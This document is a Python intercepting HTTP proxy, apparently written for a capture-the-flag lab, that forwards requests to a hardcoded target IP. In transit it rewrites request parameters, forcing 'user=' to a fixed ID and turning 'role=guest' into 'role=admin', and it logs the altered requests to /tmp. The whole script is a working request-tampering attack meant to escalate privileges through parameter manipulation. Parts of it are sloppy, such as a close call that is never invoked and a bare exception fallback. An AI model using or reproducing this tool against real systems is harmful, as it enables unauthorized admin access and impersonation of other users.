#!/usr/bin/env python3

import socket
import threading
import requests
import os
import re


class Proxy:
	def __init__(self, port=8080):
		self.port = port
		self.buffer_size = 4096

		self.proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	def run (self):
		self.proxy_sock.bind(('', self.port))
		self.proxy_sock.listen(100)
		print("[+] Proxy server is running on port : {}".format(self.port))

		while True:
			client, addr = self.proxy_sock.accept()
			print("-> {} : {}".format(addr[0], addr[1]))
			t1 = threading.Thread(target=self.process_request, args=(client,))
			t1.start()

	def process_request(self, client):
		payload = client.recv(self.buffer_size)

		try:
			payload = payload.decode()
			host = payload.split("\r\n")[1].split(' ')[1]
			
			regex_obj = re.compile(r"user=\d*")
			payload = regex_obj.sub("user=34322", payload)
			regex_obj = re.compile(r"role=guest")
			payload = regex_obj.sub("role=admin", payload)

			with open("/tmp/internet_eng/request_headers.log", 'at') as fd:
				fd.write("-> host : {}\n".format(host))

				fd.write("## Modified payload:\n")
				fd.write(payload+'\n')
				fd.write('#'*70+'\n')
		except:
			host = "10.129.191.78"
		else:
			payload = bytes(payload, "utf-8")
		finally:
			print("-> host : {}".format(host))
		
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.connect((host, 80))

		server_socket.settimeout(0.5)
		server_socket.sendall(payload)
		print("[+] Request is sent!")

		received_data = []
		chunk = 'Hii!!'
		while chunk != b'':
			try:
				chunk = server_socket.recv(4096)
			except socket.timeout:
				continue
			received_data.append(chunk)
		try:
			received_data = b''.join(received_data)
		except:
			pass
		with open("/tmp/test.log", 'at') as fd:
			fd.write('\n.'*3 + '\n')
		print("[+] Data is received!")
		print("-"*30)
		# received_data = server_socket.recv(4096*4)

		server_socket.close()

		# plain_data = received_data.decode()
		# file_path = "/tmp/test01.html"
		# with open(file_path, 'wt') as file_handle:
		# 	file_handle.write(plain_data)

		# sent_offset = 0
		# while sent_offset < len(received_data):
		# 	sent_offset += client.send(received_data[sent_offset:])
		client.sendall(received_data)

		client.close


if __name__ == "__main__":
	proxy = Proxy()
	proxy.run()
